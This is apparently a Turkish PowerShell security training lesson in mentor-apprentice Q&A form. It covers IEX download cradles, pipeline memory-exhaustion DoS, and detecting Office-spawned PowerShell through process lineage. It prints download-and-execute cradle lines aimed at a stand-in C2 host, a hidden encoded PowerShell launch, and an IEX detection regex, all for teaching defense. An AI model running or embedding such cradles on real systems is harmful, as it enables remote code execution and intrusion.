# ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR
# Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
# Bu yazılım ve ilgili tüm dosyalar ("Yazılım") yalnızca görüntüleme ve eğitim amaçlı olarak paylaşılmıştır.
# YASAKLAR: Kopyalanamaz, çoğaltılamaz, dağıtılamaz, değiştirilemez, satılamaz, tersine mühendislik yapılamaz.
# İZİN VERİLEN KULLANIM: GitHub üzerinde görüntüleme ve inceleme (kopyalamadan).
# YAZARIN AÇIK YAZILI İZNİ OLMAKSIZIN HİÇBİR KULLANIM HAKKI TANINMAZ.

# Gün 085: Soru-Cevap ve Güvenlik Senaryoları

---

### Soru 1: PowerShell Boru Hattında `Invoke-Expression` (IEX) ve Download Cradle Tehlikeleri

#### Soru Başlığı ve Tanımı
`Invoke-Expression` (`IEX`) cmdlet'i nedir; bir PowerShell boru hattında harici web istekleri veya kullanıcı girdileri IEX'e akıtıldığında (Download Cradle) nasıl bir komut enjeksiyonu ve uzaktan kod yürütme (RCE) zafiyeti (CWE-95 / CWE-829) meydana gelir?

#### Derinlemesine Teknik Analiz
PowerShell'de `Invoke-Expression`, kendisine parametre veya boru hattı üzerinden gelen herhangi bir karakter dizisini (string) alıp geçerli bir PowerShell kod bloğu gibi yorumlayarak anında çalıştırır.
Saldırganlar disk üzerinde dosya bırakmadan bellek içinde (fileless malware) çalışabilmek için **Download Cradle** adı verilen boru hattı tekniklerini kullanır:
```powershell
(New-Object System.Net.WebClient).DownloadString('http://c2.attacker.local/payload.ps1') | IEX
```
Veya modern PowerShell sürümlerinde:
```powershell
irm http://c2.attacker.local/payload.ps1 | iex
```
Bu komut çalıştığında:
1. `WebClient` veya `Invoke-RestMethod` uzak sunucudan zararlı betik metnini belleğe indirir;
2. Boru hattı (`|`) bu metni doğrudan `IEX` cmdlet'inin girdi kanalına taşır;
3. `IEX`, metni bir PowerShell ScriptBlock olarak derler ve işletim sisteminde mevcut kullanıcının tüm yetkileriyle (örneğin Local Administrator veya Domain Admin) icra eder;
4. Geleneksel dosya tabanlı antivirüsler (AV) diske dosya yazılmadığı için bu saldırıyı tespit edemez.

#### Gerçek Dünya Senaryosu ve Pratik Çözüm
Bir kurum içi sistem yöneticisi, GitHub veya şirket içi paylaşımdan otomatik konfigürasyon çeken bir betik hazırlamıştır:
`$cfgUrl = $args[0]; (New-Object Net.WebClient).DownloadString($cfgUrl) | Invoke-Expression`
Saldırgan bir DNS zehirlemesi (DNS Spoofing) veya Man-in-the-Middle (MitM) saldırısıyla `$cfgUrl` yanıtını kendi sunucusuna yönlendirir ve ters kabuk (reverse shell) açan zararlı kodu sisteme enjekte eder.

**Pratik Çözüm:**
1. **Boru Hattı Statik Denetimi:** `PipelineSyntaxAuditor` motoru tüm betiklerde `\|\s*(?:Invoke-Expression|iex)\b` ve WebClient/DownloadString kalıplarını tarar. Bu kalıp tespit edildiğinde `DangerousPipelineInvocationException` veya `DownloadCradleDetectedException` fırlatılarak betiğin çalışması engellenir.
2. **Kısıtlı Dil Modu (Constrained Language Mode - CLM):** AppLocker veya Windows Defender Application Control (WDAC) ile PowerShell CLM moduna alınır. CLM modunda boru hattında dinamik kod çalıştırma ve COM/WebClient nesneleri kilitlenir.
3. **Script Block Logging (Event ID 4104):** Grup İlkesi (GPO) üzerinden Script Block Logging aktif edilerek IEX çalıştırılsa dahi bellekte derlenen tüm kod parçaları olay günlüklerine yazılır.

#### Ustanın Çırağa Tavsiyesi
"Çırağım, `Invoke-Expression` PowerShell dünyasının `eval()`'idir; yani günahların en büyüğüdür. Bir boru hattında `| iex` gördüğün an arkasında ya aşırı tembel bir yönetici ya da çok kurnaz bir saldırgan vardır. Güvenli betikte IEX'e yer yoktur!"

---

### Soru 2: Boru Hattı Nesne Akışında Bellek Yönetimi: Streaming (`Process`) vs. Array Accumulation (DoS Riski)

#### Soru Başlığı ve Tanımı
PowerShell fonksiyonlarında `ValueFromPipeline = $true` kullanılırken `process { }` bloğu ile dizi biriktirme (array accumulation) arasındaki bellek farkı nedir? Sınırsız nesne akışı bir güvenlik aracında bellek tükenmesi (CWE-400 DoS / Pipeline Bomb) zafiyetine nasıl yol açar?

#### Derinlemesine Teknik Analiz
PowerShell nesne boru hattı iki farklı veri tüketim yaklaşımına sahiptir:

1. **Akış Yaklaşımı (Streaming Pipeline - `process` bloğu):**
   Bir cmdlet nesneyi boru hattına verdiği anda bir sonraki cmdlet'in `process` bloğu uyanır, nesneyi işler ve sonraki adıma iletir. Bellekte aynı anda sadece tek bir nesne tutulur. 10 milyon dosyalık bir dizin taranırken bile bellek kullanımı birkaç megabaytı geçmez:
   $$RAM \approx O(1)$$

2. **Dizi Biriktirme (Array Accumulation / Blocking Cmdlets):**
   Eğer boru hattında `Sort-Object` veya parantez içine alma `($GetLargeData | ...)` kullanılırsa, PowerShell bir sonraki adıma geçmeden önce **TÜM NESNELERİN** gelmesini ve bellekte birikmesini beklemek zorundadır:
   $$RAM \approx O(N)$$

Eğer bir saldırgan log akışına, dizine veya ağ soketlerine milyonlarca yapay nesne enjekte ederse (Pipeline Bomb), dizi biriktiren boru hatları sunucunun tüm RAM'ini tüketerek `OutOfMemoryException` üretir ve güvenlik izleme servisini çökertir (DoS).

#### Gerçek Dünya Senaryosu ve Pratik Çözüm
Bir SOC izleme aracı sunucudaki tüm `Get-Process` ve `Get-WinEvent` kayıtlarını `(Get-WinEvent -ListLog *) | Sort-Object | Export-Clixml` şeklinde çekmektedir. Bir saldırgan olay günlüklerine saniyede binlerce sahte olay basarak izleme aracının 16 GB belleğini tüketmiş ve SOC analistlerinin sistemden düşmesine neden olmuştur.

**Pratik Çözüm:**
`PowerShellPipelineSecurityEngine`, fail-closed bir güvenlik tavanı (`MAX_PIPELINE_OBJECTS = 5000`) uygular.
- Boru hattı akışına giren her nesne `process` bloğunda sayılarak tavan kontrol edilir.
- Nesne sayısı 5000'i aştığında motor derhal `PipelineObjectLimitExceededException` fırlatır ve bellek taşması gerçekleşmeden önce akışı keser.
- Fonksiyonlarda mutlaka `begin / process / end` ayrımı yapılarak nesneler yerel dizilerde gereksiz yere biriktirilmez.

#### Ustanın Çırağa Tavsiyesi
"Evladım, boru hattı bir su borusudur, baraj gölü değil. Suyu borudan akıtacaksın (`process`), önüne set çekip bekletmeyeceksin (`array accumulation`). Set çekersen bir gün o baraj taşar ve bütün sunucuyu sular altında bırakır!"

---

### Soru 3: Tehdit Avcılığında LOLBins ve Anormal Ebeveyn-Çocuk Süreç İlişkilerinin Tespiti

#### Soru Başlığı ve Tanımı
LOLBins (Living off the Land Binaries) nedir; saldırganlar sistemde zaten yüklü olan meşru PowerShell, CMD ve WScript araçlarını kullanarak nasıl gizlenir? Bir güvenlik boru hattı, süreç nesnelerinin ebeveyn-çocuk ilişkisini (Process Lineage) analiz ederek bu saldırıları nasıl yakalar?

#### Derinlemesine Teknik Analiz
LOLBins kavramı, saldırganın hedef sisteme harici bir zararlı yazılım (malware binary) yüklemek yerine, Windows'un kendi imzalı ve güvenilen araçlarını (`powershell.exe`, `cmd.exe`, `certutil.exe`, `mshta.exe`, `rundll32.exe`) kullanarak saldırı gerçekleştirmesidir.
Antivirüsler Microsoft imzalı `powershell.exe` dosyasını engellemez. Bu nedenle tespit için **Süreç Soy Kütüğü (Process Lineage / Parent-Child Relationship)** analizi zorunludur:

- **Meşru Ebeveyn:** `explorer.exe -> powershell.exe` (Kullanıcının başlat menüsünden PowerShell açması).
- **Meşru Servis:** `services.exe -> svchost.exe`.
- **ANORMAL / SALDIRI Ebeveyni (CWE-250):**
  - `winword.exe -> powershell.exe` (Word makrosu üzerinden kod çalıştırma - MITRE T1059.001).
  - `excel.exe -> cmd.exe` (Excel e-tablosu üzerinden komut çalıştırma).
  - `w3wp.exe -> powershell.exe` (Web sunucusu üzerinden webshell çalıştırma).

PowerShell nesne boru hattında `Get-CimInstance Win32_Process` çağrıldığında her nesne `ProcessId` ve `ParentProcessId` özelliklerine sahiptir. İki nesne kümesi boru hattında birleştirilerek ebeveyn adı anında çözümlenir.

#### Gerçek Dünya Senaryosu ve Pratik Çözüm
Bir muhasebe çalışanına "Fatura_Detayi.docm" isimli makrolu bir Word belgesi e-posta ile gelir. Çalışan belgeyi açıp "İçeriği Etkinleştir" dediğinde, arka planda Word süreci şu komut satırıyla bir PowerShell nesnesi üretir:
`powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc AAAA...`

**Pratik Çözüm:**
`ProcessPipelineHunter.evaluate_process()` algoritması süreç boru hattındaki her nesneyi kontrol eder:
1. Süreç adı `powershell.exe` veya `cmd.exe` ise ebeveyn sürecin adına bakılır.
2. Ebeveyn adı `winword.exe`, `excel.exe` veya `powerpnt.exe` kümesindeyse derhal `is_suspicious = True` bayrağı çekilir ve `ANOMALOUS_PARENT_CHILD` bulgusu üretilir.
3. Katı modda (`strict=True`) sistem derhal `AnomalousProcessLineageException` fırlatarak adli alarmı tetikler ve saldırganın komutunun tamamlanmasını engeller.

#### Ustanın Çırağa Tavsiyesi
"Çırağım, suçluyu yakalamak için sadece kim olduğuna değil, kimin çocuğu olduğuna ve kimden emir aldığına bakacaksın. Bir Word belgesi PowerShell doğuruyorsa, o doğum hayra alamet değildir; orada bir oltalama saldırısı vardır!"
